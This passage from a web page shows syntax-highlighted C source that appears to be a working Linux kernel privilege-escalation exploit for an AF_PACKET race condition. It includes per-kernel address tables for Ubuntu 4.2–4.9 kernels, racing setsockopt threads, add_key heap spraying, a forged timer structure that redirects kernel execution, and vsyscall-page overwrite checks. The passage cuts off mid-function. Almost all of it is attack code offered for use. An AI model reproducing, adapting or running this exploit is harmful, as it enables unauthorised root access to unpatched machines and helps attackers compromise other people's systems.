class="number">0xffffffff8107d640</span>,<span class="number">0xffffffff81c497c0</span>,<span class="number">0xffffffff8125de30</span>,<span class="number">0xffffffff81067750</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-21-generic #25~14.04.1"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-30-generic #36~14.04.1"</span>,<span class="number">0xffffffff8107da40</span>,<span class="number">0xffffffff81c4a8e0</span>,<span class="number">0xffffffff8125dd40</span>,<span class="number">0xffffffff81067b20</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-27-generic #32~14.04.1"</span>,<span class="number">0xffffffff8107dbe0</span>,<span class="number">0xffffffff81c498c0</span>,<span class="number">0xffffffff8125e420</span>,<span class="number">0xffffffff81067c60</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-36-generic #42"</span>,<span class="number">0xffffffff81083430</span>,<span class="number">0xffffffff81e488e0</span>,<span class="number">0xffffffff81277380</span>,<span class="number">0xffffffff8106c680</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-22-generic #40"</span>,<span class="number">0xffffffff81087d40</span>,<span class="number">0xffffffff81e48f00</span>,<span class="number">0xffffffff812864d0</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-18-generic #22~14.04.1"</span>,<span class="number">0xffffffff8107d620</span>,<span class="number">0xffffffff81c49780</span>,<span class="number">0xffffffff8125dd10</span>,<span class="number">0xffffffff81067760</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-34-generic #53"</span>,<span class="number">0xffffffff81087ea0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81286ed0</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-22-generic #27"</span>,<span class="number">0xffffffff81081ad0</span>,<span class="number">0xffffffff81c486c0</span>,<span class="number">0xffffffff81273b20</span>,<span class="number">0xffffffff8106b100</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-23-generic #28"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-25-generic #30"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-36-generic #55"</span>,<span class="number">0xffffffff81087ea0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81286e50</span>,<span class="number">0xffffffff8106f360</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-42-generic #49"</span>,<span class="number">0xffffffff81083490</span>,<span class="number">0xffffffff81e489a0</span>,<span class="number">0xffffffff81277870</span>,<span class="number">0xffffffff8106c680</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-31-generic #50"</span>,<span class="number">0xffffffff81087ea0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81286e90</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-22-generic #40~14.04.1"</span>,<span class="number">0xffffffff81084250</span>,<span class="number">0xffffffff81c4b080</span>,<span class="number">0xffffffff81273de0</span>,<span class="number">0xffffffff8106b9d0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-38-generic #45"</span>,<span class="number">0xffffffff810833d0</span>,<span class="number">0xffffffff81e488e0</span>,<span class="number">0xffffffff81277410</span>,<span class="number">0xffffffff8106c680</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-45-generic #66"</span>,<span class="number">0xffffffff81087fc0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff812874c0</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-36-generic #42~14.04.1"</span>,<span class="number">0xffffffff8107ffd0</span>,<span class="number">0xffffffff81c499e0</span>,<span class="number">0xffffffff81261ea0</span>,<span class="number">0xffffffff81069d00</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-45-generic #66~14.04.1"</span>,<span class="number">0xffffffff81084260</span>,<span class="number">0xffffffff81e4b100</span>,<span class="number">0xffffffff81274340</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-22-generic #27~14.04.1"</span>,<span class="number">0xffffffff8107d640</span>,<span class="number">0xffffffff81c497c0</span>,<span class="number">0xffffffff8125deb0</span>,<span class="number">0xffffffff81067750</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-25-generic #30~14.04.1"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-23-generic #28~14.04.1"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-46-generic #67"</span>,<span class="number">0xffffffff81088040</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81287800</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-47-generic #68"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-34-generic #53~14.04.1"</span>,<span class="number">0xffffffff81084160</span>,<span class="number">0xffffffff81c4b100</span>,<span class="number">0xffffffff81273c40</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-36-generic #55~14.04.1"</span>,<span class="number">0xffffffff81084160</span>,<span class="number">0xffffffff81c4b100</span>,<span class="number">0xffffffff81273c60</span>,<span class="number">0xffffffff8106b890</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-31-generic #50~14.04.1"</span>,<span class="number">0xffffffff81084160</span>,<span class="number">0xffffffff81c4b100</span>,<span class="number">0xffffffff81273c20</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-38-generic #45~14.04.1"</span>,<span class="number">0xffffffff8107fdc0</span>,<span class="number">0xffffffff81c4a9e0</span>,<span class="number">0xffffffff81261540</span>,<span class="number">0xffffffff81069bf0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-35-generic #40"</span>,<span class="number">0xffffffff81083430</span>,<span class="number">0xffffffff81e48860</span>,<span class="number">0xffffffff81277240</span>,<span class="number">0xffffffff8106c680</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-24-generic #43~14.04.1"</span>,<span class="number">0xffffffff81084120</span>,<span class="number">0xffffffff81c4b080</span>,<span class="number">0xffffffff812736f0</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-21-generic #37"</span>,<span class="number">0xffffffff81087cf0</span>,<span class="number">0xffffffff81e48e80</span>,<span class="number">0xffffffff81286310</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-34-generic #39~14.04.1"</span>,<span class="number">0xffffffff8107dc50</span>,<span class="number">0xffffffff81c498e0</span>,<span class="number">0xffffffff8125e830</span>,<span class="number">0xffffffff81067c90</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-24-generic #43"</span>,<span class="number">0xffffffff81087e60</span>,<span class="number">0xffffffff81e48f00</span>,<span class="number">0xffffffff812868f0</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-21-generic #37~14.04.1"</span>,<span class="number">0xffffffff81084220</span>,<span class="number">0xffffffff81c4b000</span>,<span class="number">0xffffffff81273a30</span>,<span class="number">0xffffffff8106b9d0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-41-generic #48~14.04.1"</span>,<span class="number">0xffffffff8107fe20</span>,<span class="number">0xffffffff81c4aa20</span>,<span class="number">0xffffffff812616c0</span>,<span class="number">0xffffffff81069bf0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.8.0-27-generic #29"</span>,<span class="number">0xffffffff8108ab70</span>,<span class="number">0xffffffff81e47880</span>,<span class="number">0xffffffff812b3490</span>,<span class="number">0xffffffff8106f0d0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.8.0-26-generic #28"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-38-generic #57"</span>,<span class="number">0xffffffff81087f70</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81287470</span>,<span class="number">0xffffffff8106f360</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-42-generic #62~14.04.1"</span>,<span class="number">0xffffffff81084260</span>,<span class="number">0xffffffff81e4b100</span>,<span class="number">0xffffffff81274300</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-38-generic #57~14.04.1"</span>,<span class="number">0xffffffff81084210</span>,<span class="number">0xffffffff81e4b100</span>,<span class="number">0xffffffff812742e0</span>,<span class="number">0xffffffff8106b890</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-49-generic #70"</span>,<span class="number">0xffffffff81088090</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81287d40</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-49-generic #70~14.04.1"</span>,<span class="number">0xffffffff81084350</span>,<span class="number">0xffffffff81e4b100</span>,<span class="number">0xffffffff81274b10</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-21-generic #25"</span>,<span class="number">0xffffffff81081ad0</span>,<span class="number">0xffffffff81c486c0</span>,<span class="number">0xffffffff81273aa0</span>,<span class="number">0xffffffff8106b100</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-19-generic #23"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-42-generic #49~14.04.1"</span>,<span class="number">0xffffffff8107fe20</span>,<span class="number">0xffffffff81c4aaa0</span>,<span class="number">0xffffffff81261980</span>,<span class="number">0xffffffff81069bf0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-43-generic #63"</span>,<span class="number">0xffffffff81087fc0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff812874b0</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-28-generic #47"</span>,<span class="number">0xffffffff81087ea0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81286df0</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-28-generic #47~14.04.1"</span>,<span class="number">0xffffffff81084160</span>,<span class="number">0xffffffff81c4b100</span>,<span class="number">0xffffffff81273b70</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.9.0-1-generic #2"</span>,<span class="number">0xffffffff8108bbe0</span>,<span class="number">0xffffffff81e4ac20</span>,<span class="number">0xffffffff812b8400</span>,<span class="number">0xffffffff8106f390</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.8.0-28-generic #30"</span>,<span class="number">0xffffffff8108ae10</span>,<span class="number">0xffffffff81e48b80</span>,<span class="number">0xffffffff812b3690</span>,<span class="number">0xffffffff8106f0e0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-35-generic #40~14.04.1"</span>,<span class="number">0xffffffff8107fff0</span>,<span class="number">0xffffffff81c49960</span>,<span class="number">0xffffffff81262320</span>,<span class="number">0xffffffff81069d20</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-27-generic #32"</span>,<span class="number">0xffffffff810820c0</span>,<span class="number">0xffffffff81c487c0</span>,<span class="number">0xffffffff81274150</span>,<span class="number">0xffffffff8106b620</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-42-generic #62"</span>,<span class="number">0xffffffff81087fc0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff812874a0</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-51-generic #72"</span>,<span class="number">0xffffffff81088090</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff812879a0</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line"><span class="comment">//&#123;"4.8.6-300.fc25.x86_64 #1 SMP Tue Nov 1 12:36:38 UTC 2016",0xffffffff9f0a8b30,0xffffffff9fe40940,0xffffffff9f2cfbf0,0xffffffff9f0663b0&#125;,</span></span><br><span class="line">    &#123;<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VSYSCALL 0xffffffffff600000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAD 64</span></span><br><span class="line"><span class="keyword">int</span> pad_fds[PAD];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctl_table</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *procname;</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">    <span class="keyword">int</span> maxlen;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> mode;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ctl_table</span> *<span class="title">child</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *proc_handler;</span><br><span class="line">    <span class="keyword">void</span> *poll;</span><br><span class="line">    <span class="keyword">void</span> *extra1;</span><br><span class="line">    <span class="keyword">void</span> *extra2;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONF_RING_FRAMES 1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">tp</span>;</span></span><br><span class="line"><span class="keyword">int</span> sfd;</span><br><span class="line"><span class="keyword">int</span> mapped = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *prev;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>           expires;</span><br><span class="line">    <span class="keyword">void</span>                    (*function)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>           data;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>                     flags;</span><br><span class="line">    <span class="keyword">int</span>                     slack;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">setsockopt_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(barrier) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (<span class="keyword">void</span>*) &amp;tp, <span class="keyword">sizeof</span>(tp));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">vers_switcher</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val,x,y;</span><br><span class="line">    <span class="keyword">while</span>(barrier) &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        val = TPACKET_V1;</span><br><span class="line">        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line">        y++;</span><br><span class="line">        <span class="keyword">if</span>(x != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        val = TPACKET_V3;</span><br><span class="line">        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line">        <span class="keyword">if</span>(x != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        y++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"version switcher stopping, x = %d (y = %d, last val = %d)\n"</span>,x,y,val);</span><br><span class="line">    vers_switcher_done = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 1408</span></span><br><span class="line"><span class="keyword">char</span> exploitbuf[BUFSIZE];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kmalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        syscall(__NR_add_key, <span class="string">"user"</span>,<span class="string">"wtf"</span>,exploitbuf,BUFSIZE<span class="number">-24</span>,<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pad_kmalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">for</span>(x=<span class="number">0</span>; x&lt;PAD; x++)</span><br><span class="line">        <span class="keyword">if</span>(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"pad_kmalloc() socket error\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">try_exploit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> func, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg, <span class="keyword">void</span> *verification_func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> setsockopt_thread_thread,a;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="keyword">socklen_t</span> l;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> *<span class="title">timer</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_block_desc</span> *<span class="title">pbd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> off;</span><br><span class="line">    <span class="keyword">sigset_t</span> <span class="built_in">set</span>;</span><br><span class="line">    sigemptyset(&amp;<span class="built_in">set</span>);</span><br><span class="line">    sigaddset(&amp;<span class="built_in">set</span>, SIGSEGV);</span><br><span class="line">    <span class="keyword">if</span>(pthread_sigmask(SIG_BLOCK, &amp;<span class="built_in">set</span>, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"couldn't set sigmask\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"new exploit attempt starting, jumping to %p, arg=%p\n"</span>,(<span class="keyword">void</span> *)func,(<span class="keyword">void</span> *)arg);</span><br><span class="line">    pad_kmalloc();</span><br><span class="line">    fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));</span><br><span class="line">    <span class="keyword">if</span> (fd==<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"target socket error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pad_kmalloc();</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"sockets allocated\n"</span>);</span><br><span class="line">    val = TPACKET_V3;</span><br><span class="line">    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line">    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();</span><br><span class="line">    tp.tp_block_nr = <span class="number">1</span>;</span><br><span class="line">    tp.tp_frame_size = getpagesize();</span><br><span class="line">    tp.tp_frame_nr = CONF_RING_FRAMES;</span><br><span class="line"><span class="comment">//try to set the timeout to 10 seconds</span></span><br><span class="line"><span class="comment">//the default timeout might still be used though depending on when the race was won</span></span><br><span class="line">    tp.tp_retire_blk_tov = <span class="number">10000</span>;</span><br><span class="line">    sfd = fd;</span><br><span class="line">    <span class="keyword">if</span>(pthread_create(&amp;setsockopt_thread_thread, <span class="literal">NULL</span>, setsockopt_thread, (<span class="keyword">void</span> *)<span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error creating thread\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_create(&amp;a, <span class="literal">NULL</span>, vers_switcher, (<span class="keyword">void</span> *)<span class="literal">NULL</span>);</span><br><span class="line">    usleep(<span class="number">200000</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"removing barrier and spraying..\n"</span>);</span><br><span class="line">    memset(exploitbuf,'\x00',BUFSIZE);</span><br><span class="line">    timer = (struct timer_list *)(exploitbuf+(<span class="number">0x6c</span>*<span class="number">8</span>)+<span class="number">6</span><span class="number">-8</span>);</span><br><span class="line">    timer-&gt;next = <span class="number">0</span>;</span><br><span class="line">    timer-&gt;prev = <span class="number">0</span>;</span><br><span class="line">    timer-&gt;expires = <span class="number">4294943360</span>;</span><br><span class="line">    timer-&gt;function = (<span class="keyword">void</span> *)func;</span><br><span class="line">    timer-&gt;data = arg;</span><br><span class="line">    timer-&gt;flags = <span class="number">1</span>;</span><br><span class="line">    timer-&gt;slack = <span class="number">-1</span>;</span><br><span class="line">    barrier = <span class="number">0</span>;</span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line">    <span class="keyword">while</span>(!vers_switcher_done)usleep(<span class="number">100000</span>);</span><br><span class="line">    l = <span class="keyword">sizeof</span>(val);</span><br><span class="line">    getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, &amp;l);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"current packet version = %d\n"</span>,val);</span><br><span class="line">    pbd = mmap(<span class="number">0</span>, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(pbd == MAP_FAILED) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"could not map pbd\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        off = pbd-&gt;hdr.bh1.offset_to_first_pkt;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"pbd-&gt;hdr.bh1.offset_to_first_pkt = %d\n"</span>,off);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(val == TPACKET_V1 &amp;&amp; off != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"race not won\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    munmap(pbd, tp.tp_block_size * tp.tp_block_nr);</span><br><span class="line">    pthread_create(&amp;a, <span class="literal">NULL</span>, verification_func, (<span class="keyword">void</span> *)<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.\n"</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"closing socket and verifying.."</span>);</span><br><span class="line">    close(sfd);</span><br><span class="line">    kmalloc();</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"all messages sent\n"</span>);</span><br><span class="line">    sleep(<span class="number">31337</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> verification_result = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">catch_sigsegv</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    verification_result = <span class="number">0</span>;</span><br><span class="line">    pthread_exit((<span class="keyword">void</span> *)<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">modify_vsyscall</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *vsyscall = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(VSYSCALL+<span class="number">0x850</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> x = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="keyword">sigset_t</span> <span class="built_in">set</span>;</span><br><span class="line">    sigemptyset(&amp;<span class="built_in">set</span>);</span><br><span class="line">    sigaddset(&amp;<span class="built_in">set</span>, SIGSEGV);</span><br><span class="line">    <span class="keyword">if</span>(pthread_sigmask(SIG_UNBLOCK, &amp;<span class="built_in">set</span>, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"couldn't set sigmask\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    signal(SIGSEGV, catch_sigsegv);</span><br><span class="line">    *vsyscall = <span class="number">0xdeadbeef</span>+x;</span><br><span class="line">    <span class="keyword">if</span>(*vsyscall == <span class="number">0xdeadbeef</span>+x) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"\nvsyscall page altered!\n"</span>);</span><br><span class="line">        verification_result = <span class="number">1</span>;</span><br><span class="line">        pthread_exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">verify_stage1</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">pthread_t</span> v_thread;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">for</span>(x=<span class="number">0</span>; x&lt;<span class="number">300</span>; x++) &#123;</span><br><span class="line">        pthread_create(&amp;v_thread, <span class="literal">NULL</span>, modify_vsyscall, <span class="number">0</span>);</span><br><span class="line">        pthread_join(v_thread, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(verification_result == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        write(<span class="number">2</span>,<span class="string">"."</span>,<span class="number">1</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"could not modify vsyscall\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">verify_stage2</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">b</span>;</span></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">for</span>(x=<span class="number">0</span>; x&lt;<span 